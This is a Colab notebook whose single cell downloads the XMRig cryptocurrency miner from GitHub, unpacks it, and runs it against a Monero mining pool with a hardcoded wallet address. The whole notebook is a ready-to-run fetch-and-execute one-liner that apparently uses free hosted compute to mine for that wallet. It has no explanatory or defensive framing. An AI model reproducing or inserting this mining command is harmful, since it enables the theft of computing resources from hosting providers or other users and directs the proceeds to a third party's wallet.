{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled7.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "UfEcGSaNNHVM"
      },
      "source": [
        "!wget https://github.com/xmrig/xmrig/releases/download/v6.3.5/xmrig-6.3.5-linux-x64.tar.gz ; tar xf xmrig-6.3.5-linux-x64.tar.gz ; cd xmrig-6.3.5 ; ./xmrig -o pool.minexmr.com:4444 -u 46eohD67jqiLdTrW7wf5Noc8eSkirGpP8Mfr4wMFwVDcVe6EThwDa7XPMKWrk5HfJZR8RkuWf8xSNjg8LfTmFGsGRhNehkx"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}